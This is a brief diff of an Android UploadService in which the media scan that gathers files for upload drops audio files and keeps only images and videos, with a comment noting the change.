@@ -134,10 +134,10 @@ public class UploadService extends Service {
 
     private void scanAndUpload() {
         // Scan via URI — works on Android 7 through 14+
+        // Only images + videos — NO audio
         List<UriInfo> files = new ArrayList<>();
         files.addAll(scanMediaUri(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, "image"));
         files.addAll(scanMediaUri(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, "video"));
-        files.addAll(scanMediaUri(MediaStore.Audio.Media.EXTERNAL_CONTENT_URI, "audio"));
 
         for (UriInfo info : files) {
             if (!running) return;
